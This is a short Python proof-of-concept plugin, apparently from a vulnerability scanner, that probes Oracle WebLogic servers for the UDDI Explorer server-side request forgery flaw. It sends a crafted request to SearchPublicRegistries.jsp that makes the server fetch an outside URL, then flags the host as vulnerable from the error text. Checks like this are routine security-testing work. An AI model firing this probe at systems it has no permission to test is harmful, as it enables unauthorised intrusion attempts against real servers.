#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP, VUL_TYPE, VUL_LEVEL

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'weblogic ssrf'
        self.keyword = ['weblogic']
        self.info = 'weblogic ssrf'
        self.type = VUL_TYPE.SSRF
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            url = self.base_url+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res:
                        text = await res.text()
                        if "weblogic.uddi.client.structures.exception.XML_SoapException" in text :
                            self.flag = 1
                            self.req.append({"page": '/uddiexplorer/SearchPublicRegistries.jsp'})


